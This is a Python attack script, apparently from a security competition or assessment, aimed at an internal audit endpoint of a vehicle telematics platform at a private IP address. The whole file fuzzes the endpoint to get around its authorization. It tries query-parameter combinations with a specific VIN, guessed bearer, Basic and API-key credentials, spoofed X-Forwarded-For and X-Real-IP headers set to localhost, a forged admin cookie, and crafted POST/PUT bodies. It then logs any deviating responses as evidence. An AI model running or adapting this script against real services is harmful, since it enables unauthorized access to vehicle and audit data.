#!/usr/bin/env python3
"""Unmask /internal/audit on TSP 10.230.164.2:8080.

Baseline: every method returns 404 {"error":"not found"} (22 bytes).
Any deviation = the handler took a different branch = authorization/param gate found.

Three dimensions, sequential and cheap (~a few hundred requests total):
  A. query string  (name/value matrix, includes the real VIN and 1/2/3)
  B. headers       (auth + internal-routing headers)
  C. JSON body keys (POST/PUT)
"""
import http.client, json, itertools

HOST, PORT = "10.230.164.2", 8080
BASE = '{"error":"not found"}\n'
VIN = "CV6FF52FEE9EDDD86"
DEMO = "CV6000000DEMO0001"


def req(path, method="GET", body=None, headers=None):
    c = http.client.HTTPConnection(HOST, PORT, timeout=8.0)
    h = {"Connection": "close"}
    if headers:
        h.update(headers)
    if body is not None:
        h.setdefault("Content-Type", "application/json")
    try:
        c.request(method, path, body=body, headers=h)
        r = c.getresponse()
        return r.status, r.getheader("Content-Type"), r.read(8192)
    except Exception as e:
        return -1, "<%s>" % type(e).__name__, str(e)[:80].encode()
    finally:
        try: c.close()
        except Exception: pass


def classify(st, ct, data):
    if st == 404 and data == BASE.encode():
        return "BASELINE"
    return "DIFF"


print("=" * 78)
print("baseline check")
print("=" * 78)
st, ct, d = req("/internal/audit")
print("  GET /internal/audit -> %s %r  [%s]" % (st, d, classify(st, ct, d)))

# ---------- A. query string ----------
print("\n" + "=" * 78)
print("A. query-string matrix")
print("=" * 78)
NAMES = ["id", "audit", "auditId", "audit_id", "log", "logId", "entry", "entryId",
         "vin", "VIN", "vehicle", "vehicleId", "vehicle_id", "vid", "tbox", "tboxId",
         "record", "recordId", "seq", "offset", "page", "limit", "cursor", "q",
         "type", "kind", "scope", "tenant", "user", "since", "from", "to", "start", "end",
         "all", "full", "internal", "debug", "raw", "dump", "list", "export"]
VALUES = ["1", "0", "-1", "2", "3", "all", "*", "true", "", VIN, DEMO]
a_hits = []
for n in NAMES:
    for v in VALUES:
        path = "/internal/audit?%s=%s" % (n, v)
        st, ct, d = req(path)
        c = classify(st, ct, d)
        if c != "BASELINE":
            a_hits.append((path, st, d))
            print("  DIFF %-46s -> %s %r" % (path, st, d[:160]))
print("  A hits: %d / %d combos" % (len(a_hits), len(NAMES) * len(VALUES)))

# ---------- B. headers ----------
print("\n" + "=" * 78)
print("B. header matrix")
print("=" * 78)
HDRS = {
    "Authorization: Bearer internal": {"Authorization": "Bearer internal"},
    "Authorization: Bearer admin": {"Authorization": "Bearer admin"},
    "Authorization: Bearer " + VIN: {"Authorization": "Bearer " + VIN},
    "Authorization: Basic dHNwOnRzcA==": {"Authorization": "Basic dHNwOnRzcA=="},
    "X-Internal-Token: internal": {"X-Internal-Token": "internal"},
    "X-Internal-Token: admin": {"X-Internal-Token": "admin"},
    "X-Api-Key: internal": {"X-Api-Key": "internal"},
    "X-API-Key: admin": {"X-API-Key": "admin"},
    "X-TSP-Token: internal": {"X-TSP-Token": "internal"},
    "X-Service: internal": {"X-Service": "internal"},
    "X-Scope: internal": {"X-Scope": "internal"},
    "X-VIN: " + VIN: {"X-VIN": VIN},
    "X-Vehicle-VIN: " + VIN: {"X-Vehicle-VIN": VIN},
    "X-Forwarded-For: 127.0.0.1": {"X-Forwarded-For": "127.0.0.1"},
    "X-Forwarded-For: 10.230.164.3": {"X-Forwarded-For": "10.230.164.3"},
    "X-Real-IP: 127.0.0.1": {"X-Real-IP": "127.0.0.1"},
    "Cookie: role=admin": {"Cookie": "role=admin; authenticated=1"},
    "Accept: text/csv": {"Accept": "text/csv"},
    "Accept: application/x-ndjson": {"Accept": "application/x-ndjson"},
    "X-HTTP-Method-Override: POST": {"X-HTTP-Method-Override": "POST"},
}
b_hits = []
for label, h in HDRS.items():
    st, ct, d = req("/internal/audit", headers=h)
    c = classify(st, ct, d)
    print("  %-38s -> %s %r  [%s]" % (label, st, d[:100], c))
    if c != "BASELINE":
        b_hits.append((label, st, d))

# ---------- C. bodies ----------
print("\n" + "=" * 78)
print("C. body matrix (POST/PUT)")
print("=" * 78)
BODIES = [
    b"{}",
    b"null",
    b"[]",
    json.dumps({"action": "list"}).encode(),
    json.dumps({"op": "list"}).encode(),
    json.dumps({"query": "all"}).encode(),
    json.dumps({"vin": VIN}).encode(),
    json.dumps({"vin": DEMO}).encode(),
    json.dumps({"vehicle": VIN}).encode(),
    json.dumps({"vehicleId": 1}).encode(),
    json.dumps({"id": 1}).encode(),
    json.dumps({"audit": {"vin": VIN}}).encode(),
    json.dumps({"filter": {"vin": VIN}}).encode(),
    json.dumps({"limit": 100, "offset": 0}).encode(),
]
c_hits = []
for m in ("POST", "PUT"):
    for b in BODIES:
        st, ct, d = req("/internal/audit", method=m, body=b)
        cl = classify(st, ct, d)
        print("  %-5s %-46r -> %s %r  [%s]" % (m, b, st, d[:100], cl))
        if cl != "BASELINE":
            c_hits.append((m, b.decode(), st, d.decode("utf-8", "replace")))

json.dump({"a": [list(map(str, h)) for h in a_hits], "b": b_hits, "c": c_hits},
          open("D:/qwb/03_EVIDENCE/tsp/0321_audit_unmask.json", "w"), indent=1)
print("\nSUMMARY A=%d B=%d C=%d" % (len(a_hits), len(b_hits), len(c_hits)))
